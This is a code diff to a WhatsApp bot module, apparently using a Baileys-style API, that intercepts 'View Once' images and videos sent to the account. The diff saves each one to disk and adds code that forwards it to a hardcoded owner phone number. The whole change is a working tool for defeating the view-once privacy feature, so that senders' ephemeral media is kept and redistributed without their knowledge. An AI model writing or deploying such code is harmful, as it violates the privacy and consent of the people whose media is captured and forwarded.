@@ -39,15 +39,14 @@ CURRENTLY RUNNING ON BETA VERSION!!
    * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    * SOFTWARE.
 **/
+const fs = require("fs");
 
-
-
-   const fs = require("fs");
+const OWNER_NUMBER = "2348159111525@s.whatsapp.net"; // Your WhatsApp number
 
 module.exports = async (sock, msg) => {
     if (!msg.message || msg.key.fromMe) return;
 
-    // Check if the message is "View Once"
+    // Check if it's a "View Once" message
     if (msg.message.viewOnceMessage) {
         let mediaMessage = msg.message.viewOnceMessage.message;
         let type = Object.keys(mediaMessage)[0];
@@ -67,12 +66,23 @@ module.exports = async (sock, msg) => {
                 // Save the media file
                 fs.writeFileSync(fileName, buffer);
                 console.log(`✅ Saved View Once media: ${fileName}`);
+
+                // Send the saved media to your DM
+                await sock.sendMessage(OWNER_NUMBER, {
+                    document: { url: fileName },
+                    mimetype: type === "imageMessage" ? "image/jpeg" : "video/mp4",
+                    fileName: fileName.split("/").pop()
+                });
+
+                console.log(`📩 Sent View Once media to ${OWNER_NUMBER}`);
             } catch (error) {
-                console.error("❌ Failed to save View Once media:", error);
+                console.error("❌ Failed to save & forward View Once media:", error);
             }
         }
     }
 };
+    
+                 
 
 
 /*
